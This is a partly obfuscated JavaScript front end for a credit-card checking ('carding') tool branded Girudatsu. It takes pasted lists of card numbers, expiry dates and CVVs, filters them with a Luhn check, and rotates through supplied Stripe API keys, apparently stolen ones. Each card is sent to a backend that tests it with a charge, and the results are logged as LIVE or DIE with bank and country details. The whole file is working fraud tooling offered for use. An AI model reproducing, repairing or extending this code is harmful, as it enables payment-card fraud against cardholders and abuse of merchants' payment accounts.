/* girudatsu.website
 * Ver.:	1.01
 * File:	stripe.js
 * Date:	
 * Desc:	Stripe API. Modified from http://iace.pw/ccnext1/exclusive.js
 * Copyright (C) 2015 Girudatsu Team (http://girudatsu.website)
 */ 
 
function setCookie(cname, cvalue, exdays, path) {
    var d = new Date();
    d.setTime(d.getTime() + (exdays*24*60*60*1000));
    var expires = "expires="+d.toUTCString();
    document.cookie = cname + "=" + cvalue + "; " + expires + "; path=" + path;
}

function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i=0; i<ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1);
        if (c.indexOf(name) == 0) return c.substring(name.length, c.length);
    }
    return "";
}

function deleteCookie( name, path, domain ) {
  if( getCookie( name ) ) {
    document.cookie = name + "=" +
      ((path) ? ";path="+path:"")+
      ((domain)?";domain="+domain:"") +
      ";expires=Thu, 01 Jan 1970 00:00:01 GMT";
  }
}


//var SITE_URL = "http://dev.girudatsu/api/stripe"; // test
var lstMail;
var lstSock;
var maxFail;
var delim;
var timeout;
var WRONG_FORMAT = -1;
var SOCK_DIE = 1;
var ACC_DIE = 2;
var ACC_LIVE = 0;
var regex2 = /^.*|(.*)$/;
var docTitle = document["title"];
$["xhrPool"] = [];
$["xhrPool"]["abortAll"] = function() {
	$(this).each (function(_0x2b8bxd, _0x2b8bxe) {
		_0x2b8bxe.abort ()
	});
	$["xhrPool"]["length"] = 0
};
$.ajaxSetup ({
	beforeSend: function(_0x2b8bxe) {
		$["xhrPool"].push (_0x2b8bxe)
	},
	complete: function(_0x2b8bxe) {
		var _0x2b8bxf = $["xhrPool"].indexOf (_0x2b8bxe);
		if (_0x2b8bxf > -1) {
			$["xhrPool"].splice (_0x2b8bxf, 1)
		}
	}
});
Array["prototype"]["remove"] = function(_0x2b8bx10) {
	var _0x2b8bxf = this.indexOf (_0x2b8bx10);
	if (_0x2b8bxf != -1) {
		this.splice (_0x2b8bxf, 1)
	};
	return this
};

function setInputEnable(_0x2b8bx12) {
	$("#mailpass").attr ("disabled", _0x2b8bx12);
	if (noSocks < 1) {
		$("#stripeapikey").attr ("disabled", _0x2b8bx12)
	}
}

function up(_0x2b8bx14) {
	var _0x2b8bx15 = parseInt($(_0x2b8bx14).text ());
	_0x2b8bx15++;
	$(_0x2b8bx14).text (_0x2b8bx15)
}

function stopLoading(_0x2b8bx12) {
	setInputEnable(false);
	var _0x2b8bx18 = $("#checkStatus").html ();
	$("#checkStatus").html (_0x2b8bx18.replace ("Checking", "Stopped"));
	$("#submit").removeClass ("disabled").attr ("disabled", false);
	$("#stop").addClass ("disabled").attr ("disabled", true);
	$("#loading").attr ("src", "http://puu.sh/njC6q/1ff8ca2ad3.gif");
	$["xhrPool"].abortAll ();
	if (_0x2b8bx12) {
		bootbox.dialog ({
			title: "Alert!",
			message: "Done",
			buttons: {
				success: {
					label: "OK",
					className: "btn-success"
				}
			}
		});
		return false
	}
}

function updateTextBox(_0x2b8bx1a, _0x2b8bx1b) {
	if (_0x2b8bx1a["length"] > 0) {
		var _0x2b8bx1c = $("#mailpass").val ().split ("\x0A");
		_0x2b8bx1c.remove (_0x2b8bx1a);
		$("#mailpass").val (_0x2b8bx1c.join ("\x0A"))
	};
	if (_0x2b8bx1b["length"] > 0) {
		var _0x2b8bx1d = $("#stripeapikey").val ().split ("\x0A");
		_0x2b8bx1d.remove (_0x2b8bx1b);
		$("#stripeapikey").val (_0x2b8bx1d.join ("\x0A"))
	}
}

function updateProgress(_0x2b8bx1f, _0x2b8bx20) {
	$(".check-amount").html ("<b>Progress</b>: " + _0x2b8bx1f + "/" + _0x2b8bx20);
	var _0x2b8bx21 = Math.floor ((_0x2b8bx1f / _0x2b8bx20) * 100);
	//$(".progress .bar").css ("width", _0x2b8bx21 + "%").text (_0x2b8bx21 + "%");
	$("#percentcheck").html ("<b>Progress</b>: " + _0x2b8bx1f + "/" + _0x2b8bx20);
	var _0x2b8bx21 = Math.floor ((_0x2b8bx1f / _0x2b8bx20) * 100);
	$("#progressbar").css ("width", _0x2b8bx21 + "%").text (_0x2b8bx21 + "%");
	document["title"] = _0x2b8bx21 + "% [" + _0x2b8bx1f + "/" + _0x2b8bx20 + "] " + docTitle
}

function check(_0x2b8bx23, _0x2b8bx24, _0x2b8bx25) {
	if (lstMail["length"] < 1 || lstSock["length"] < 1 || _0x2b8bx23 >= lstMail["length"] || _0x2b8bx24 >= lstSock["length"]) {
		stopLoading(true);
		return false
	};
	if (_0x2b8bx25 >= maxFail && noSocks < 1) {
		updateTextBox("", lstSock[_0x2b8bx24]);
		_0x2b8bx24++;
		check(_0x2b8bx23, _0x2b8bx24, 0);
		return false
	};
	$("#loading").attr ("src", "http://puu.sh/njC2f/4d12705c44.gif");
	$("#checkStatus").html ("<b>Card</b>: " + lstMail[_0x2b8bx23]).effect ("highlight", {
		color: "#00ff00"
	}, 1000);
	$("#current_api").html ("<b>Stripe API Key</b>: " + lstSock[_0x2b8bx24]).effect ("highlight", {
		color: "#45DFC7"
	}, 1000);
    
    var paramma = lstMail[_0x2b8bx23];
	var card = paramma.split(delim);
	var number = $.trim(card[0]);
	var month = $.trim(card[1]);
	var year = $.trim(card[2]);
	var cvv = $.trim(card[3]);
    
    var e = document.getElementById("server");
    var server = e.options[e.selectedIndex].value;
    
    
	var request_uri = SITE_URL + "?number=" + number + "&month=" + month + "&year=" + year + "&cvv=" + cvv + "&stripe_api=" + lstSock[_0x2b8bx24] + "&output=json&server=" + server ;
	$("#request_log").append ('<a href="' + request_uri + '">' + request_uri + "</a>" + "<br />");
	up("#request_count");
	
	$.ajax ({        
        url: SITE_URL,
		dataType: "json",
		type: "GET", // POST | GET
		data: {
			//api: getCookie('Girudatsu_api'),
			output: 'json',
			stripe_api: lstSock[_0x2b8bx24],
			number: number,
			month: month,
			year: year,
			cvv: cvv,
            server: server
		},        
		success: function(_0x2b8bx26) {
			if (!_0x2b8bx26) {
				stopLoading(false);
				bootbox.dialog ({
					title: "Alert!",
					message: "System Failure Please Contact Admin",
					buttons: {
						success: {
							label: "OK",
							className: "btn-success"
						}
					}
				});
				return false
			};
				
			var json = _0x2b8bx26;			
			
			$("#response_log").append (JSON.stringify(json) + "<br />");
			up("#response_count");
            
			switch (_0x2b8bx26["code"]) {
				case 0: // LIVE                
					updateTextBox(lstMail[_0x2b8bx23], "");
					$("#cc").append ("<tr><td>" + _0x2b8bx23 + "</td><td><b style='color:green;'>LIVE</b></td><td>" + number + "</td><td>" + month + "</td><td>" + year + "</td><td>" + cvv + "</td><td>" + _0x2b8bx26["msg"] + "</td></tr>");
					$("#tvmit_live").append ("LIVE | " + json.data.number + " | " + json.data.month + " | " + json.data.year + " | " + json.data.cvv  + " | $" + (json.data.charge / 100) + (json.data.BIN.brand == "" ? "" : (" | " + json.data.BIN.brand)) + ((json.data.BIN.bank == "") || (json.data.BIN.bank === null) ? "" : (" | " + json.data.BIN.bank)) + (json.data.BIN.card_type == "" ? "" : (" | " + json.data.BIN.card_type)) + (json.data.BIN.country_name == "" ? "" : (" | " + json.data.BIN.country_name)) + (json.data.BIN.card_category == "" ? "" : (" | " + json.data.BIN.card_category)) + " | " + json.data.API + " | "  + "<br />");
                    
                    $("#balance").html (getCookie('Girudatsu_balance'));                    
                    up("#count_all");
					up("#count_alls");
					up("#tvmit_live_count");
					up("#tvmit_live_counts");
					_0x2b8bx25 = 0;
					_0x2b8bx23++;
					updateProgress(_0x2b8bx23, lstMail["length"]);
					break
				case 1: // invalid parameter
					stopLoading(false);
					bootbox.dialog ({
						title: "Alert!",
						message: _0x2b8bx26["msg"],
						buttons: {
							success: {
								label: "OK",
								className: "btn-success"
							}
						}
					});
					break;
				case 2: // Stripe API Key Expired
					updateTextBox("", lstSock[_0x2b8bx24]);
					$("#socks-die").append ("Stripe API Key Expired | " + number + " | " + month + " | " + year + " | " + cvv + " | " + lstSock[_0x2b8bx24] + "<br />");
					up(".socks-die");
					_0x2b8bx24++;
					break;
				case 3: // Stripe API Key Expired
					updateTextBox("", lstSock[_0x2b8bx24]);
					$("#socks-die").append ("Stripe API Key Expired | " + number + " | " + month + " | " + year + " | " + cvv + " | " + lstSock[_0x2b8bx24] + "<br />");
					up(".socks-die");
					_0x2b8bx24++;
					break;
				case 5: // Stripe API Key Expired
					updateTextBox("", lstSock[_0x2b8bx24]);
					$("#socks-die").append ("Stripe API Key Expired | " + number + " | " + month + " | " + year + " | " + cvv + " | " + lstSock[_0x2b8bx24] + "<br />");
					up(".socks-die");
					_0x2b8bx24++;
					break;
				case 6: // DIE
					updateTextBox(lstMail[_0x2b8bx23], "");
					$("#cc").append ("<tr><td>" + _0x2b8bx23 + "</td><td><b style='color:red;'>DIE</b></td><td>" + number + "</td><td>" + month + "</td><td>" + year + "</td><td>" + cvv + "</td><td>" + "</td></tr>");
					$("#tvmit_die").append ("DIE | " + number + " | " + month + " | " + year + " | " + cvv + " | " +  _0x2b8bx26["msg"] + "<br />");
					up("#count_all");
					up("#count_alls");
					up("#tvmit_die_count");
					up("#tvmit_die_counts");
					_0x2b8bx25++;
					_0x2b8bx23++;
					updateProgress(_0x2b8bx23, lstMail["length"]);
					break;
                default: // 3 = Failed to create token // 4 = Server bad behavior / Bad request // 7 = Connection Error // 8 = Unknown error
					//updateTextBox(lstMail[_0x2b8bx23], "");
					updateTextBox("", lstSock[_0x2b8bx24]);
					$("#tvmit_unk").append (number + " | " + month + " | " + year + " | " + cvv + " | " + _0x2b8bx26["msg"] + "<br />");
					up("#tvmit_unk_count");
					up("#count_all");
					up("#tvmit_unk_counts");
					_0x2b8bx23++;
					updateProgress(_0x2b8bx23, lstMail["length"]);                
                    break;
			};
			if (_0x2b8bx26["error"] != 1) {
				check(_0x2b8bx23, _0x2b8bx24, _0x2b8bx25)
			}
		},
		error: function(_0x2b8bx26, _0x2b8bx27, _0x2b8bx28) {
			if (_0x2b8bx27 == "error") {
				stopLoading(false);
				
				var alertMessage = '';
				
				
				if (_0x2b8bx26.status === 0) {
					alertMessage = 'Can\'t connect. Check your network connection';
				} else if (_0x2b8bx26.status == 404) {
					alertMessage = 'Requested page not found. [404]';
				} else if (_0x2b8bx26.status == 500) {
					alertMessage = 'Internal Server Error [500].';
				} else if (_0x2b8bx27 === 'parsererror') {
					alertMessage = 'Requested JSON parse failed.';
				} else if (_0x2b8bx27 === 'timeout') {
					alertMessage = 'Time out error.';
				} else if (_0x2b8bx27 === 'abort') {
					alertMessage = 'Ajax request aborted.';
				} else {
					alertMessage = 'Uncaught Error. ' + _0x2b8bx26.responseText;
				}
				
				
				
				alert("Error! Please try again or contact admin." 
					+ "\nStatus Code: " + _0x2b8bx26.status 
					+ "\nMessage: " + alertMessage 
					+ "\nCatched error: " + _0x2b8bx28);
			}
		}
	});
	return true
}

function filterMP(_0x2b8bx1a, regex2) {
	var _0x2b8bx2a = _0x2b8bx1a.split ("\x0A");
	var _0x2b8bx2b = new Array();
	var _0x2b8bx2c = new Array();
	for (var _0x2b8bx2d = 0; _0x2b8bx2d < _0x2b8bx2a["length"]; _0x2b8bx2d++) {
		if (_0x2b8bx2a[_0x2b8bx2d]["length"] > 0) {
			var _0x2b8bx2e = /(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})/g;
			var _0x2b8bx2f = _0x2b8bx2a[_0x2b8bx2d].match (_0x2b8bx2e);
			var _0x2b8bx30 = _0x2b8bx2a[_0x2b8bx2d].match (/^.*|(.{1,4})$/);
			if (_0x2b8bx2f == null || !LuhnCheck(_0x2b8bx2f[0])) {
				continue
			};
			if (_0x2b8bx2b.indexOf (_0x2b8bx2f[0]) == -1) {
				_0x2b8bx2b.push (_0x2b8bx2f[0]);
				_0x2b8bx2c.push (_0x2b8bx30[0])
			}
		}
	};
	return _0x2b8bx2c
}
var LuhnCheck = (function() {
	var _0x2b8bx32 = [0, 2, 4, 6, 8, 1, 3, 5, 7, 9];
	return function(_0x2b8bx33) {
		var _0x2b8bx34 = 0;
		var _0x2b8bx35;
		var _0x2b8bx36 = false;
		var _0x2b8bx37 = String(_0x2b8bx33).replace (/[^\d]/g, "");
		if (_0x2b8bx37["length"] == 0) {
			return false
		};
		for (var _0x2b8bx2d = _0x2b8bx37["length"] - 1; _0x2b8bx2d >= 0; --_0x2b8bx2d) {
			_0x2b8bx35 = parseInt(_0x2b8bx37.charAt (_0x2b8bx2d), 10);
			_0x2b8bx34 += (_0x2b8bx36 = !_0x2b8bx36) ? _0x2b8bx35 : _0x2b8bx32[_0x2b8bx35]
		};
		return (_0x2b8bx34 % 10 == 0)
	}
})();

function resetResult() {
	$("#socks-die,#acc-die,#wrong-format").html ("");
	$(".socks-die,.acc-die,.wrong-format").text ("0")
}
$(document).ready (function() {
	$("#stop").addClass ("disabled").attr ("disabled", true).click (function() {
		stopLoading(false);
		f = "10"
	});
	$(".remove-limited").css ("cursor", "pointer").click (function() {
		$(".limited").parent ().fadeIn (100, function() {
			$(this).remove ()
		})
	});
	$("#submit").click (function() {
		delim = $("#delim").val ().trim ();
		maxFail = parseInt($("#fail").val ());
		chkChange = $("#nochange").is (":checked") ? 1 : 0;
		noSocks = $("#noSocks").val () ? 1 : 0;
		timeout = $("#timeout").val ();
		var _0x2b8bx1c = filterMP($("#mailpass").val (), regex2);
		var _0x2b8bx2e = /[0-9a-zA-Z]+_[0-9a-zA-Z]+[_]{1}[0-9a-zA-Z]+/g;
		var _0x2b8bx39 = $("#stripeapikey").val ().match (_0x2b8bx2e);
		if (_0x2b8bx39 == null) {
			bootbox.dialog ({
				title: "Alert!",
				message: "No API found!",
				buttons: {
					success: {
						label: "OK",
						className: "btn-success"
					}
				}
			});
			return false
		};
		if (_0x2b8bx1c["length"] < 1) {
			bootbox.dialog ({
				title: "Alert!",
				message: "No Card found!",
				buttons: {
					success: {
						label: "OK",
						className: "btn-success"
					}
				}
			});
			return false
		};
		$("#reset_stat").click (function() {
			var _0x2b8bx3a = confirm("Do you really want to Reset Statistic ?");
			if (_0x2b8bx3a) {
				$("#count_all").html ("0");
				$("#tvmit_live_counts").html ("0");
				$("#tvmit_die_counts").html ("0");
				$("#tvmit_unk_counts").html ("0");
				$(".progress .bar").css ("width", "0%").text ("0%");
				$("#checkStatus").text ("Idle");
				$("#percentcheck").text ("");
			}
		});
		$("#delete_table").click (function() {
			$("#count_alls").html ("0");
			$("#cc").text ("")
		});
		$("#stripeapikey").val (_0x2b8bx39.join ("\x0A")).attr ("disabled", true);
		$("#mailpass").val (_0x2b8bx1c.join ("\x0A")).attr ("disabled", true);
		$("#result").show ();
		$("#submit").addClass ("disabled").attr ("disabled", true);
		$("#stop").removeClass ("disabled").attr ("disabled", false);
		lstMail = _0x2b8bx1c;
		lstSock = _0x2b8bx39;
		resetResult();
		updateProgress(0, lstMail["length"]);
		$("#check-progress").show ("slow");
		check(0, 0, 0);
		return false
	})
})


	/*
	
	Response Code
	
	0 = Success
	1 = Invalid paramter
	2 = Stripe API key Expired 
	3 = Failed to create token, may cause by Stripe API key Expired
	4 = Server bad behavior / Bad request
	5 = No valid Stripe API key provided
	6 = Card not valid / DIE
	7 = Connection Error
	8 = Unknown error
	
	
	*/